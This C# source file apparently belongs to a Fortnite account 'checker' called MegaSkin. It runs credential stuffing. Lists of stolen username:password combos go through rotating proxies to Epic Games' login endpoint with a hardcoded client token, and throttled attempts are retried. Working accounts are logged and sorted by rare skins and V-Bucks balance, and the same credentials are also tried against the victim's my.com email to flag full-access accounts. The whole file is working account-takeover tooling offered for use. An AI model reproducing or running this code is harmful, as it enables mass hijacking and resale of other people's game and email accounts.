using System;
using System.Collections.Generic;
using System.Threading;
using Newtonsoft.Json.Linq;
using System.IO;
using Leaf.xNet;
using System.Text.RegularExpressions;
using System.Collections;

namespace MegaSkin.Checker
{
    class Check
    {
        public static void CallWorker()
        {
            while (Globals.Combo.Count != 0)
            {
                if (Globals.Combo.Count == 0) Globals.isRunning = false;
                if (Globals.isRunning == false) Thread.CurrentThread.Abort();

                Globals.Combo.TryDequeue(out string combo);
                Globals.Proxy.TryDequeue(out string proxy);
                Globals.Proxy.Enqueue(proxy);

                using (HttpRequest req = new HttpRequest())
                {
                    req.KeepAlive = true;
                    req.AllowAutoRedirect = false;
                    req.IgnoreProtocolErrors = true;

                    req.AddHeader("Accept", "*/*");
                    req.UserAgent = "Fortnite/++Fortnite+Release-4.5-CL-4166199 Windows/6.2.9200.1.768.64bit";
                    req.AddHeader("Authorization", "basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=");

                    RunChecker(req, combo, proxy);
                }
            }
        }

        private static void RunChecker(HttpRequest req, string combo, string proxy)
        {
            try
            {
                if (Globals.RunningProxyless != true)
                {
                    if (Globals.proxyType == ProxyType.HTTP) req.Proxy = HttpProxyClient.Parse(proxy);
                    else if (Globals.proxyType == ProxyType.Socks4) req.Proxy = Socks4ProxyClient.Parse(proxy);
                    else if (Globals.proxyType == ProxyType.Socks4A) req.Proxy = Socks4AProxyClient.Parse(proxy);
                    else if (Globals.proxyType == ProxyType.Socks5) req.Proxy = Socks5ProxyClient.Parse(proxy);
                    req.Proxy.ConnectTimeout = Globals.ProxyTimeout;
                }

                string[] strArrays = new string[] { "grant_type=password&username=", null, null, null, null };
                strArrays[1] = combo.Split(new char[] { ':', ';', '|' })[0].Replace(" ", "");
                strArrays[2] = "&password=";
                strArrays[3] = combo.Split(new char[] { ':', ';', '|' })[1].Replace(" ", "");
                strArrays[4] = "&includePerms=true&token_type=eg1";

                string data = req.Post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token", string.Concat(strArrays), "application/x-www-form-urlencoded").ToString();

                if (data.Contains("access_token"))
                {
                    if (Globals.DoSkinChecker == true)
                    {
                        string access_token = Regex.Match(data, "access_token\" : \"(.*?)\",").Groups[1].ToString();
                        string AccountId = Regex.Match(data, "account_id\" : \"(.*?)\",").Groups[1].ToString();

                        string str = string.Concat(new string[] { "https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/", AccountId, "/client/QueryProfile?profileId=athena&rvn=-1" });
                        req.AddHeader("Authorization", "bearer " + access_token);

                        string content = req.Post(str, "{}", "application/json").ToString();

                        if (!content.Contains("errors.com.epicgames.common.missing_action"))
                        {
                            string username = "Unknown";
                            string created = "Unknown";
                            int VBucks = 0;

                            JObject jobject2 = JObject.Parse(content);
                            string text2 = jobject2.ToString();

                            created = jobject2["profileChanges"][0]["profile"]["created"].ToString();

                            List<string> Skins = new List<string>();
                            List<string> Backblings = new List<string>();
                            List<string> Pickaxes = new List<string>();
                            List<string> Gliders = new List<string>();
                            List<string> Rares = new List<string>();

                            foreach (object skin in IDS.Skins)
                            {
                                DictionaryEntry dicEntry = (DictionaryEntry)skin;
                                if (content.Contains(dicEntry.Key.ToString()))
                                {
                                    Skins.Add($"-> {dicEntry.Value.ToString()}");
                                }
                            }

                            foreach (object backblings in IDS.Backblings)
                            {
                                DictionaryEntry dicEntry = (DictionaryEntry)backblings;
                                if (content.Contains(dicEntry.Key.ToString()))
                                {
                                    Backblings.Add($"-> {dicEntry.Value.ToString()}");
                                }
                            }

                            foreach (object pickaxes in IDS.Pickaxes)
                            {
                                DictionaryEntry dicEntry = (DictionaryEntry)pickaxes;
                                if (content.Contains(dicEntry.Key.ToString()))
                                {
                                    Pickaxes.Add($"-> {dicEntry.Value.ToString()}");
                                }
                            }

                            foreach (object gliders in IDS.Gliders)
                            {
                                DictionaryEntry dicEntry = (DictionaryEntry)gliders;
                                if (content.Contains(dicEntry.Key.ToString()))
                                {
                                    Gliders.Add($"-> {dicEntry.Value.ToString()}");
                                }
                            }

                            foreach (string UserRares in UserData.Rares)
                            {
                                if (content.Contains(UserRares))
                                {
                                    SaveToDisk("UserRares", combo);
                                }
                            }

                            foreach (string rareSkin in Globals.RareSkins)
                            {
                                if (content.Contains(rareSkin))
                                {
                                    File.AppendAllText(string.Concat("Results/", Globals.ResultsFolder, $"/rares.txt"), string.Concat(combo, Environment.NewLine));
                                    Globals.Rares++;
                                    break;
                                }
                            }

                            try
                            {
                                req.ClearAllHeaders();
                                req.AddHeader("Authorization", "bearer " + access_token);
                                string Profile = req.Get("https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/" + AccountId).ToString();
                                Console.WriteLine(Profile);

                                JObject jobject = JObject.Parse(Profile);

                                username = jobject["displayName"].ToString();
                            }
                            catch (Exception)
                            {
                            }

                            if (content.Contains("CID_017_Athena_Commando_M".ToLower())) { SaveToDisk("Aerial Assault Trooper", combo); Rares.Add("-> Aerial Assault Trooper"); }
                            if (content.Contains("CID_022_Athena_Commando_F".ToLower())) { SaveToDisk("Recon Expert", combo); Rares.Add("-> Recon Expert"); }
                            if (content.Contains("CID_028_Athena_Commando_F".ToLower())) { SaveToDisk("Renegade Raider", combo); Rares.Add("-> Renegade Raider"); }
                            if (content.Contains("CID_029_Athena_Commando_F_Halloween".ToLower())) { SaveToDisk("Ghoul Trooper", combo); Rares.Add("-> Ghoul Trooper"); }
                            if (content.Contains("CID_035_Athena_Commando_M_Medieval".ToLower())) { SaveToDisk("Black Knight", combo); Rares.Add("-> Black Knight"); }
                            if (content.Contains("CID_039_Athena_Commando_F_Disco".ToLower())) { SaveToDisk("Sparkle Specialist", combo); Rares.Add("-> Sparkle Specialist"); }
                            if (content.Contains("CID_051_Athena_Commando_M_HolidayElf".ToLower())) { SaveToDisk("Codename ELF", combo); Rares.Add("-> Codename E.L.F."); }
                            if (content.Contains("CID_175_Athena_Commando_M_Celestial".ToLower())) { SaveToDisk("Galaxy", combo); Rares.Add("-> Galaxy"); }
                            if (content.Contains("CID_259_Athena_Commando_M_StreetOps".ToLower())) { SaveToDisk("Reflex", combo); Rares.Add("-> Reflex"); }
                            if (content.Contains("CID_313_Athena_Commando_M_KpopFashion".ToLower())) { SaveToDisk("IKONIK", combo); Rares.Add("-> IKONIK"); }
                            if (content.Contains("CID_174_Athena_Commando_F_CarbideWhite".ToLower())) { SaveToDisk("Eon", combo); Rares.Add("-> Eon"); }
                            if (content.Contains("CID_434_Athena_Commando_F_StealthHonor".ToLower())) { SaveToDisk("Wonder", combo); Rares.Add("-> Wonder"); }
                            if (content.Contains("CID_342_Athena_Commando_M_StreetRacerMetallic".ToLower())) { SaveToDisk("Honor Guard", combo); Rares.Add("-> Honor Guard"); }
                            if (content.Contains("Glider_ID_001".ToLower())) { SaveToDisk("Aerial Assault One", combo); Rares.Add("-> Aerial Assault One"); }
                            if (content.Contains("Pickaxe_Lockjaw".ToLower())) { SaveToDisk("Raider's Revenge", combo); Rares.Add("-> Raider's Revenge"); }
                            if (content.Contains("Glider_Warthog".ToLower())) { SaveToDisk("Mako", combo); Rares.Add("-> Mako"); }

                            if (content.Contains("CID_030_Athena_Commando_M_Halloween".ToLower()))
                            {
                                try
                                {
                                    foreach (JToken token in JObject.Parse(content)["profileChanges"][0]["profile"]["items"].Children())
                                    {
                                        if (token.First["templateId"].ToString() == "AthenaCharacter:cid_030_athena_commando_m_halloween" && token.First["attributes"].ToString().Contains("Mat1"))
                                        {
                                            Rares.Add("-> OG Skull Trooper");
                                            SaveToDisk("OG Skull Trooper", combo);
                                            Globals.OG_SKULL++;
                                            Globals.Rares++;
                                        }
                                    }
                                }
                                catch
                                {
                                    Globals.Errors++;
                                    Globals.Combo.Enqueue(combo);
                                }
                            }

                            req.ClearAllHeaders();
                            req.AddHeader("Accept", "*/*");
                            req.AddHeader("Authorization", "bearer " + access_token);
                            string json2 = req.Post("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/" + AccountId + "/client/QueryProfile?profileId=common_core&rvn=-1", "{\"{   }\":\"\"}", "application/json").ToString();
                            JObject jobject3 = JObject.Parse(json2);

                            string[] GetVBucks = jobject3["profileChanges"][0]["profile"]["items"].ToString().Split(new string[]
                            {
                                "\r\n"
                            }, StringSplitOptions.None);

                            int i = 0;
                            while (i < GetVBucks.Length)
                            {
                                if (GetVBucks[i].Contains("Currency:MtxGiveaway"))
                                {
                                    string text3 = GetVBucks[i + 4];
                                    VBucks = int.Parse(text3.Split(new char[]
                                    {
                                        ':'
                                    })[1]);
                                    break;
                                }
                                i++;
                            }

                            if (VBucks != 0)
                            {
                                if (VBucks >= 2500) SaveToDiskVbucks("2500+", combo, VBucks);
                                else if (VBucks >= 2000) SaveToDiskVbucks("2000+", combo, VBucks);
                                else if (VBucks >= 1000) SaveToDiskVbucks("1000+", combo, VBucks);
                                else if (VBucks >= 500) SaveToDiskVbucks("500+", combo, VBucks);
                                else if (VBucks >= 100) SaveToDiskVbucks("100+", combo, VBucks);

                                if (VBucks >= UserData.LogVbucksAmount) SaveToDiskVbucks("UserAmount", combo, VBucks);
                            }

                            if (Skins.Count != 0)
                            {
                                Capture(content);
                                File.AppendAllText(string.Concat("Results/", Globals.ResultsFolder, "/Skinned.txt"), string.Concat(combo, Environment.NewLine));
                                SaveCapture.WriteToDisk(combo, AccountId, created, username, isFA(combo), VBucks, Skins, Backblings, Pickaxes, Gliders, Rares);

                                if (Skins.Count >= UserData.LogSkinsAmount) SaveToDisk("UserAmount", combo);

                                Globals.Skinned++;
                            }
                            else
                            {
                                if (UserData.SaveNoSkins == true) File.AppendAllText(string.Concat("Results/", Globals.ResultsFolder, "/No-Skins.txt"), string.Concat(combo, Environment.NewLine));

                                Globals.NoSkins++;
                            }
                        }
                    }

                    File.AppendAllText(string.Concat("Results/", Globals.ResultsFolder, "/All-Hits.txt"), string.Concat(combo, Environment.NewLine));
                    Globals.Valid++;
                    Globals.CPS++;
                }
                else if (data.Contains("Sorry the account credentials you are using are invalid") || data.Contains("Real ID association is required") || data.Contains("Please reset your password to proceed with login"))
                {
                    Globals.Invalid++;
                    Globals.CPS++;
                }
                else
                {
                    if (data.Contains("errors.com.epicgames.common.throttled") || data.Contains("Process exited before completing"))
                    {
                        Globals.Errors++;
                        Globals.Combo.Enqueue(combo);
                    }
                    else if (data.Contains("account has been locked because of too many invalid login attempts") || data.Contains("Sorry the account you are using is not active"))
                    {
                        Globals.Banned++;
                        Globals.CPS++;
                    }
                    else if (data.Contains("Two-Factor authentication required to process"))
                    {
                        Globals.NeedAuth++;
                        Globals.CPS++;
                    }
                    else
                    {
                        Globals.Errors++;
                        Globals.Combo.Enqueue(combo);
                    }
                }
            }
            catch (Exception)
            {
                Globals.Errors++;
                Globals.Combo.Enqueue(combo);
            }
            Thread.Sleep(1);
        }

        private static void Capture(string content)
        {
            if (content.Contains("CID_175_Athena_Commando_M_Celestial".ToLower())) Globals.Galaxy++;
            if (content.Contains("CID_313_Athena_Commando_M_KpopFashion".ToLower())) Globals.IKONIK++;
            if (content.Contains("CID_174_Athena_Commando_F_CarbideWhite".ToLower())) Globals.Eon++;
            if (content.Contains("CID_113_Athena_Commando_M_BlueAce".ToLower())) Globals.Rb++;
            if (content.Contains("CID_259_Athena_Commando_M_StreetOps".ToLower())) Globals.Reflex++;
            if (content.Contains("CID_342_Athena_Commando_M_StreetRacerMetallic".ToLower())) Globals.Honor++;
            if (content.Contains("CID_434_Athena_Commando_F_StealthHonor".ToLower())) Globals.Wonder++;

            if (content.Contains("CID_035_Athena_Commando_M_Medieval".ToLower())) Globals.BK++;
            if (content.Contains("CID_039_Athena_Commando_F_Disco".ToLower())) Globals.SS++;
            if (content.Contains("CID_051_Athena_Commando_M_HolidayElf".ToLower())) Globals.CodeName++;
            if (content.Contains("CID_226_Athena_Commando_F_Octoberfest".ToLower())) Globals.Heidi++;
            if (content.Contains("Glider_Warthog".ToLower())) Globals.Mako++;
            if (content.Contains("Glider_ID_001".ToLower())) Globals.AA1++;

            if (content.Contains("CID_022_Athena_Commando_F".ToLower())) Globals.RE++;
            if (content.Contains("CID_028_Athena_Commando_F".ToLower())) Globals.RR++;
            if (content.Contains("CID_029_Athena_Commando_F_Halloween".ToLower())) Globals.GT++;
            if (content.Contains("CID_017_Athena_Commando_M".ToLower())) Globals.Aerial++;
            if (content.Contains("Pickaxe_Lockjaw".ToLower())) Globals.RR_AXE++;
        }

        private static void SaveToDisk(string filename, string combo)
        {
            File.AppendAllText(string.Concat("Results/", Globals.ResultsFolder, "/Rares", $"/{filename}.txt"), string.Concat(combo, Environment.NewLine));
        }

        private static void SaveToDiskVbucks(string filename, string combo, int VBucks)
        {
            File.AppendAllText(string.Concat("Results/", Globals.ResultsFolder, "/V-Bucks", $"/{filename}.txt"), string.Concat($"{combo} - {VBucks} V-Bucks", Environment.NewLine));
        }

        private static string isFA(string combo)
        {
            using (HttpRequest req = new HttpRequest())
            {
                try
                {
                    req.Proxy = null;
                    req.KeepAlive = true;
                    req.IgnoreProtocolErrors = true;
                    req.AllowAutoRedirect = false;

                    string data = req.Get(string.Concat(new string[]
                    {
                        "https://aj-https.my.com/cgi-bin/auth?Login=",
                        combo.Split(new char[]{ ':', ';', '|' })[0].ToString().Replace(" ", ""),
                        combo.Split(new char[]{ ':', ';', '|' })[1].ToString().Replace(" ", ""),
                        "&reqmode=fg&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS%C2%A4t=MyCom&mmp=mail&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS%C2%A4t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=fr_FR&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad"
                    }), null).ToString();

                    if (data.Contains("Ok=1"))
                    {
                        File.AppendAllText(string.Concat("Results/", Globals.ResultsFolder, "/FA.txt"), string.Concat(combo, Environment.NewLine));

                        return "True";
                    }
                    else if (data.Contains("Ok=0"))
                    {
                        return "False";
                    }
                    else
                    {
                        return "Unknown";
                    }
                }
                catch (Exception)
                {
                    return "Unknown";
                }
            }
        }
    }
}
